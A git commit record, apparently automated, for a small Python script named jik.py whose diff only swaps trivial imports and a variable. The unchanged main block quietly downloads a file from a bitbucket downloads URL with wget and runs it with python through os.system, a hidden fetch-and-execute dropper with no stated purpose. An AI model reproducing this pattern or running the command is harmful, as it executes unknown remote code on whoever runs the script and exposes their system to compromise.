842c70fc684eacaa54f8d0c270a61dbf8f31fd21
Your Name <you@example.com>
2024-08-05 01:23:50 +0200

    auto

--- jik.py
+++ jik.py
@@ -1,4 +1,4 @@
-import os, sys,base64
-t=2
+import os, sys,mailbox
+b=8
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
